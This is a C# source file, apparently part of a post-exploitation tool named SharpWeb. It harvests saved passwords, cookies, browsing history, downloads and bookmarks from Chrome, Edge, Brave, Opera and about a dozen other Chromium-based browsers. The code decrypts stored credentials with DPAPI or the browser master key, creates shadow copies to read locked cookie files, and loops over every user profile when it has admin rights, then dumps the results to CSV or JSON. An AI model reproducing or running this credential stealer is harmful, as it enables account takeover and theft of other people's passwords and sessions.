using System;
using System.Security.Cryptography;
using System.Text;
using System.IO;
using System.Collections.Generic;
using static SharpWeb.Browsers.GetKey;
using SharpWeb.Utilities;
using Community.CsharpSqlite.SQLiteClient;
using static SharpWeb.Utilities.Current;
using static SharpWeb.Display.OutputFormatting;
using static SharpWeb.Utilities.Vsscopy;

namespace SharpWeb.Browsers
{
    class Chromium
    {
        public static string browser_name;
        public static void Histroy(string chrome_History_path, string browser_name)
        {
            try
            {
                string[] header = new string[] { "URL", "TITLE", "AccessDate" };
                List<string[]> data = new List<string[]> { };

                string fileName = Path.Combine("out", browser_name + "_history");
                string History_tempFile = CreateTmpFile(chrome_History_path);

                SqliteConnection con = new SqliteConnection(String.Format("Version=3,uri=file://{0}", History_tempFile));
                con.Open();
                SqliteCommand drop = new SqliteCommand("DROP TABLE if EXISTS cluster_visit_duplicates;DROP TABLE if EXISTS clusters_and_visits;", con);
                drop.ExecuteNonQuery();
                SqliteCommand query = new SqliteCommand("SELECT url, title, last_visit_time FROM urls", con);
                SqliteDataReader reader = query.ExecuteReader();
                while (reader.Read())
                {
                    string name = reader.GetValue(0).ToString();
                    string value = reader.GetValue(1).ToString();

                    long lastDate;
                    Int64.TryParse(reader.GetValue(2).ToString(), out lastDate);
                    PrintNorma("    ---------------------------------------------------------");
                    PrintSuccess(String.Format("URL: {0}", name), 1);
                    PrintSuccess(String.Format("TITLE: {0}", value), 1);
                    PrintSuccess(String.Format("AccessDate: {0}", TypeUtil.TimeEpoch(lastDate)), 1);
                    data.Add(new string[] { name, value, TypeUtil.TimeEpoch(lastDate).ToString() });
                }
                con.Close();
                if (Program.format.Equals("json", StringComparison.OrdinalIgnoreCase))
                    WriteJson(header, data, fileName);
                else
                    WriteCSV(header, data, fileName);
                File.Delete(History_tempFile);
            }
            catch
            {
                PrintFail(String.Format("{0} Not Found!", chrome_History_path), 1);
            }
            Console.WriteLine();
        }



        public static void Download(string chrome_Download_path, string browser_name)
        {
            try
            {
                string Download_tempFile = CreateTmpFile(chrome_Download_path);

                string[] header = new string[] { "URL", "PATH", "TIME" };
                List<string[]> data = new List<string[]> { };

                string fileName = Path.Combine("out", browser_name + "_download");

                SqliteConnection con = new SqliteConnection(String.Format("Version=3,uri=file://{0}", Download_tempFile));
                con.Open();
                SqliteCommand drop = new SqliteCommand("DROP TABLE if EXISTS cluster_visit_duplicates;DROP TABLE if EXISTS clusters_and_visits;", con);
                drop.ExecuteNonQuery();
                SqliteCommand query = new SqliteCommand("select current_path,tab_url,last_access_time from downloads", con);
                SqliteDataReader reader = query.ExecuteReader();
                while (reader.Read())
                {
                    string path = reader.GetValue(0).ToString();
                    string url = reader.GetValue(1).ToString();
                    long lastDate;
                    Int64.TryParse(reader.GetValue(2).ToString(), out lastDate);

                    PrintNorma("    ---------------------------------------------------------");
                    PrintSuccess(String.Format("URL: {0}", url), 1);
                    PrintSuccess(String.Format("PATH: {0}", path), 1);
                    PrintSuccess(String.Format("AccessDate: {0}", TypeUtil.TimeEpoch(lastDate)), 1);
                    data.Add(new string[] { url, path, TypeUtil.TimeEpoch(lastDate).ToString() });
                }
                con.Close();
                if (Program.format.Equals("json", StringComparison.OrdinalIgnoreCase))
                    WriteJson(header, data, fileName);
                else
                    WriteCSV(header, data, fileName);
                File.Delete(Download_tempFile);
            }
            catch
            {
                PrintFail(String.Format("{0} Not Found!", chrome_Download_path), 1);
            }
            Console.WriteLine();
        }

        private static string PathCookie(string chrome_cookie_path)
        {
            string shadowCopyID = string.Empty;
            string cookie_tempFile = string.Empty;
            try
            {
                cookie_tempFile = Path.GetTempFileName();
                File.Copy(chrome_cookie_path, cookie_tempFile, true);
            }
            catch
            {
                string newCookie = chrome_cookie_path.Replace("C:", "");
                shadowCopyID = CreateShadow();
                cookie_tempFile = @"C:\Users\Public\C";
                string path = String.Format("{0}{1}", ListShadow(shadowCopyID), newCookie);
                Natives.CopyFile(path, cookie_tempFile, true);
                DeleteShadow(shadowCopyID);
            }
            return cookie_tempFile;
        }
        public static void Cookies(string chrome_cookie_path, string chrome_state_file)
        {
            try
            {
                string cookie_data_tempFile = PathCookie(chrome_cookie_path);
                string[] Jsonheader = new string[] { "domain", "expirationDate", "hostOnly", "httpOnly", "name", "path", "sameSite", "secure", "session", "storeId", "value" };
                List<string[]> Jsondata = new List<string[]> { };

                string[] header = new string[] { "HOST", "COOKIE", "Path", "IsSecure", "Is_httponly", "HasExpire", "IsPersistent", "CreateDate", "ExpireDate", "AccessDate" };
                List<string[]> data = new List<string[]> { };

                string fileName = Path.Combine("out", browser_name + "_cookie");
                SqliteConnection con = new SqliteConnection(String.Format("Version=3,uri=file://{0}", cookie_data_tempFile));
                con.Open();
                SqliteCommand query = new SqliteCommand("SELECT cast(creation_utc as text) as creation_utc, host_key, name, path, cast(expires_utc as text) as expires_utc, cast(last_access_utc as text) as last_access_utc, encrypted_value, is_secure, is_httponly,has_expires,is_persistent,samesite FROM cookies", con);
                SqliteDataReader reader = query.ExecuteReader();
                while (reader.Read())
                {
                    string host_key = reader.GetValue(1).ToString();
                    string name = reader.GetValue(2).ToString();
                    string http_only = is_true_false(reader.GetValue(8).ToString());
                    string IsPersistent = is_true_false(reader.GetValue(10).ToString());
                    string IsSecure = is_true_false(reader.GetValue(7).ToString());
                    string HasExpire = is_true_false(reader.GetValue(9).ToString());
                    byte[] cookieBytes = (byte[])reader.GetValue(6);
                    string cookie_value;

                    long expDate;
                    Int64.TryParse(reader.GetValue(4).ToString(), out expDate);

                    long lastDate;
                    Int64.TryParse(reader.GetValue(5).ToString(), out lastDate);

                    long creDate;
                    Int64.TryParse(reader.GetValue(0).ToString(), out creDate);

                    int sameSite = -1;
                    int.TryParse(reader.GetValue(11).ToString(), out sameSite);

                    string sameSiteString = TryParsesameSite(reader.GetValue(11).ToString());

                    string path = reader.GetValue(3).ToString();
                    try
                    {
                        cookie_value = Encoding.UTF8.GetString(ProtectedData.Unprotect(cookieBytes, null, DataProtectionScope.CurrentUser));
                    }
                    catch
                    {
                        byte[] masterKey = GetMasterKey(chrome_state_file);
                        cookie_value = DecryptWithKey(cookieBytes, masterKey);
                    }
                    PrintNorma("    ---------------------------------------------------------");
                    PrintSuccess(String.Format("HOST: {0}", host_key), 1);
                    PrintSuccess(String.Format("COOKIE: {0}={1}", name, cookie_value), 1);
                    PrintSuccess(String.Format("CreateDate: {0}", TypeUtil.TimeEpoch(creDate)), 1);
                    PrintSuccess(String.Format("ExpireDate: {0}", TypeUtil.TimeEpoch(expDate)), 1);
                    PrintSuccess(String.Format("AccessDate: {0}", TypeUtil.TimeEpoch(lastDate)), 1);
                    PrintSuccess(String.Format("Path: {0}", path), 1);
                    string cookie = String.Format("{0}={1}", name, cookie_value);

                    Jsondata.Add(new string[] { host_key, expDate.ToString(), "false", http_only, name, path, sameSiteString, IsSecure, "true", "0", cookie_value });
                    data.Add(new string[] { host_key, cookie, path, IsSecure, http_only, HasExpire, IsPersistent, TypeUtil.TimeEpoch(creDate).ToString(), TypeUtil.TimeEpoch(expDate).ToString(), TypeUtil.TimeEpoch(lastDate).ToString() });
                }
                con.Close();
                
                if (Program.format.Equals("json", StringComparison.OrdinalIgnoreCase))
                    WriteJson(Jsonheader, Jsondata, fileName);
                else
                    WriteCSV(header, data, fileName);
                File.Delete(cookie_data_tempFile);
            }
            catch
            {
                PrintFail("Cookies File Not Found OR Not Administrator Privileges!", 1);
            }
            Console.WriteLine();
        }

        public static void Bookmark(string chrome_book_path)
        {
            try
            {
                string tempFile = CreateTmpFile(chrome_book_path);
                string booktext = File.ReadAllText(tempFile);
                Utilities.Bookmark.Treat(booktext);
            }
            catch
            {
                PrintFail(String.Format("{0} Not Found!", chrome_book_path), 1);
            }
        }

        public static void Logins(string login_data_path, string chrome_state_file)
        {
            try
            {
                string login_data_tempFile = CreateTmpFile(login_data_path);

                
                string[] header = new string[] { "URL", "USERNAME", "PASSWORD", "CreateDate" };

                List<string[]> data = new List<string[]> { };
                string fileName = Path.Combine("out", browser_name + "_password");

                SqliteConnection con = new SqliteConnection(String.Format("Version=3,uri=file://{0}", login_data_tempFile));
                con.Open();
                SqliteCommand query = new SqliteCommand("SELECT origin_url, username_value, password_value, cast(date_created as text) as date_created FROM logins", con);
                SqliteDataReader reader = query.ExecuteReader();
                while (reader.Read())
                {
                    string password;
                    string url = reader.GetValue(0).ToString();
                    string username = reader.GetValue(1).ToString();
                    byte[] passwordBytes = (byte[])reader.GetValue(2);

                    long creDate;
                    Int64.TryParse(reader.GetValue(3).ToString(), out creDate);

                    try
                    {
                        password = Encoding.UTF8.GetString(ProtectedData.Unprotect(passwordBytes, null, DataProtectionScope.CurrentUser));
                    }
                    catch
                    {
                        byte[] masterKey = GetMasterKey(chrome_state_file);
                        password = DecryptWithKey(passwordBytes, masterKey);
                    }
                    PrintNorma("    ---------------------------------------------------------");
                    data.Add(new string[] { url, username, password, TypeUtil.TimeEpoch(creDate).ToString() });
                    PrintSuccess(String.Format("{0}: {1}", "URL", url), 1);
                    PrintSuccess(String.Format("{0}: {1}", "USERNAME", username), 1);
                    PrintSuccess(String.Format("{0}: {1}", "PASSWORD", password), 1);
                    PrintSuccess(String.Format("{0}: {1}", "CreateDate", TypeUtil.TimeEpoch(creDate).ToString()), 1);
                }
                con.Close();
                if (Program.format.Equals("json", StringComparison.OrdinalIgnoreCase))
                    WriteJson(header, data, fileName);
                else
                    WriteCSV(header, data, fileName);
                File.Delete(login_data_tempFile);
            }
            catch
            {
                PrintFail(String.Format("{0} Not Found OR Decryption failed!", login_data_path), 1);
            }

            Console.WriteLine();

        }

        public static void GetChromium(string[] name)
        {
            try
            {
                browser_name = name[0];

                if (IsHighIntegrity())
                {
                    //未解决，待添加域backupkey
                    string userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
                    string[] dirs = Directory.GetDirectories(userFolder);
                    foreach (string dir in dirs)
                    {
                        if (dir.Contains("All Users") || dir.Contains("Public") || dir.Contains("Default"))
                            continue;
                        string[] parts = dir.Split('\\');
                        string userName = parts[parts.Length - 1];
                        string userChromeHistoryPath = String.Format("{0}{1}\\History", dir, name[1]);
                        string userChromeBookmarkPath = String.Format("{0}{1}\\Bookmarks", dir, name[1]);
                        string userChromeLoginDataPath = String.Format("{0}{1}\\Login Data", dir, name[1]);
                        string userChromeCookiesPath = String.Format("{0}{1}\\Cookies", dir, name[1]);
                        string path;
                        if (name[1].Contains("Default"))
                        {
                            path = name[1].Replace("\\Default", string.Empty);
                        }
                        else
                        {
                            path = name[1];
                        }
                        string userChromeStatePath = String.Format("{0}{1}\\Local State", Environment.GetEnvironmentVariable("USERPROFILE"), path);
                        string[] chromePaths = { userChromeHistoryPath, userChromeBookmarkPath, userChromeLoginDataPath, userChromeCookiesPath, userChromeStatePath };
                        if (FileExists(chromePaths))
                        {
                            Console.WriteLine(String.Format("========================== {0} (All Users) ==========================", name[0]));
                            PrintVerbose(String.Format("Get {0} Login Data", name[0]));
                            Logins(userChromeLoginDataPath, userChromeStatePath);

                            PrintVerbose(String.Format("Get {0} Bookmarks", name[0]));
                            Bookmark(userChromeBookmarkPath);
                            Console.WriteLine();

                            bool old_chrome_cookie_path = File.Exists(userChromeCookiesPath);

                            if (!old_chrome_cookie_path)
                                userChromeCookiesPath = dir + name[1] + @"\Network\Cookies";
                            PrintVerbose(String.Format("Get {0} Cookie", name[0]));
                            Cookies(userChromeCookiesPath, userChromeStatePath);

                            PrintVerbose(String.Format("Get {0} History", name[0]));
                            Histroy(userChromeHistoryPath, name[0]);
                            PrintVerbose(String.Format("Get {0} Downloads", name[0]));
                            Download(userChromeHistoryPath, name[0]);
                        }
                    }
                }
                else
                {
                    string userChromeHistoryPath = String.Format("{0}{1}\\History", Environment.GetEnvironmentVariable("USERPROFILE"), name[1]);
                    string userChromeBookmarkPath = String.Format("{0}{1}\\Bookmarks", Environment.GetEnvironmentVariable("USERPROFILE"), name[1]);
                    string userChromeLoginDataPath = String.Format("{0}{1}\\Login Data", Environment.GetEnvironmentVariable("USERPROFILE"), name[1]);
                    string userChromeCookiesPath = String.Format("{0}{1}\\Cookies", Environment.GetEnvironmentVariable("USERPROFILE"), name[1]);
                    string path;
                    if (name[1].Contains("Default"))
                    {
                        path = name[1].Replace("\\Default", string.Empty);
                    }
                    else
                    {
                        path = name[1];
                    }
                    string userChromeStatePath = String.Format("{0}{1}\\Local State", Environment.GetEnvironmentVariable("USERPROFILE"), path);
                    string[] chromePaths = { userChromeHistoryPath, userChromeBookmarkPath, userChromeCookiesPath, userChromeLoginDataPath };
                    if (FileExists(chromePaths))
                    {
                        Console.WriteLine(String.Format("========================== {0} (Current Users) ==========================", name[0]));
                        PrintVerbose(String.Format("Get {0} Login Data", name[0]));
                        Logins(userChromeLoginDataPath, userChromeStatePath);

                        PrintVerbose(String.Format("Get {0} Bookmarks", name[0]));
                        Bookmark(userChromeBookmarkPath);
                        Console.WriteLine();

                        bool old_chrome_cookie_path = File.Exists(userChromeCookiesPath);

                        if (!old_chrome_cookie_path)
                            userChromeCookiesPath = Environment.GetEnvironmentVariable("USERPROFILE") + name[1] + @"\Network\Cookies";
                        PrintVerbose(String.Format("Get {0} Cookie", name[0]));
                        Cookies(userChromeCookiesPath, userChromeStatePath);

                        PrintVerbose(String.Format("Get {0} History", name[0]));
                        Histroy(userChromeHistoryPath, name[0]);
                        PrintVerbose(String.Format("Get {0} Downloads", name[0]));
                        Download(userChromeHistoryPath, name[0]);
                        Console.WriteLine();
                    }
                }
            }
            catch
            {
                PrintFail("Not Found");
            }
        }

        public static void Chromium_kernel()
        {
            string[][] name = new string[][]
            {
                new string[] { "Chrome", "\\AppData\\Local\\Google\\Chrome\\User Data\\Default" } ,
                new string[]{ "Chrome Beta", "\\AppData\\Local\\Google\\Chrome Beta\\User Data\\Default" },
                new string[]{ "Chromium", "\\AppData\\Local\\Chromium\\User Data\\Default" },
                new string[]{ "Edge", "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default" },
                new string[]{ "360 Speed", "\\AppData\\Local\\360chrome\\Chrome\\User Data\\Default" },
                new string[]{ "360 Speed X", "\\AppData\\Local\\360ChromeX\\Chrome\\User Data\\Default" },
                new string[]{ "Brave", "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default" },
                new string[]{ "QQ", "\\AppData\\Local\\Tencent\\QQBrowser\\User Data\\Default" },
                new string[]{ "Opera", "\\AppData\\Roaming\\Opera Software\\Opera Stable" },
                new string[]{ "OperaGX", "\\AppData\\Roaming\\Opera Software\\Opera GX Stable" },
                new string[]{ "Vivaldi", "\\AppData\\Local\\Vivaldi\\User Data\\Default" },
                new string[]{ "CocCoc", "\\AppData\\Local\\CocCoc\\Browser\\User Data\\Default" },
                new string[]{ "Yandex", "\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default" },
                new string[]{ "DCBrowser", "\\AppData\\Local\\DCBrowser\\User Data\\Default" },
                new string[]{ "Old Sogou", "\\AppData\\Roaming\\SogouExplorer\\Webkit\\Default" },
                new string[]{ "New Sogou", "\\AppData\\Local\\Sogou\\SogouExplorer\\User Data\\Default" }
            };
            foreach (var n in name)
            {
                GetChromium(n);
            }
        }

        public static void Specify_path(string names, string paths)
        {
            browser_name = names;
            string userChromeHistoryPath = String.Format("{0}\\History", paths);
            string userChromeBookmarkPath = String.Format("{0}\\Bookmarks", paths);
            string userChromeLoginDataPath = String.Format("{0}\\Login Data", paths);
            string userChromeCookiesPath = String.Format("{0}\\Cookies", paths);
            string path;
            if (paths.Contains("Default"))
            {
                path = paths.Replace("\\Default", string.Empty);
            }
            else
            {
                path = paths;
            }
            string userChromeStatePath = String.Format("{0}\\Local State", path);
            string[] chromePaths = { userChromeHistoryPath, userChromeBookmarkPath, userChromeCookiesPath, userChromeLoginDataPath };
            if (FileExists(chromePaths))
            {
                Console.WriteLine(String.Format("========================== {0} (Current Users) ==========================", names));
                PrintVerbose(String.Format("Get {0} Login Data", names));
                Logins(userChromeLoginDataPath, userChromeStatePath);

                PrintVerbose(String.Format("Get {0} Bookmarks", names));
                Bookmark(userChromeBookmarkPath);
                Console.WriteLine();
                bool old_chrome_cookie_path = File.Exists(userChromeCookiesPath);
                if (!old_chrome_cookie_path)
                    userChromeCookiesPath = paths + @"\Network\Cookies";
                PrintVerbose(String.Format("Get {0} Cookie", names));
                Cookies(userChromeCookiesPath, userChromeStatePath);

                PrintVerbose(String.Format("Get {0} History", names));
                Histroy(userChromeHistoryPath, names);
                PrintVerbose(String.Format("Get {0} Downloads", names));
                Download(userChromeHistoryPath, names);
                Console.WriteLine();
            }

        }
    }
}
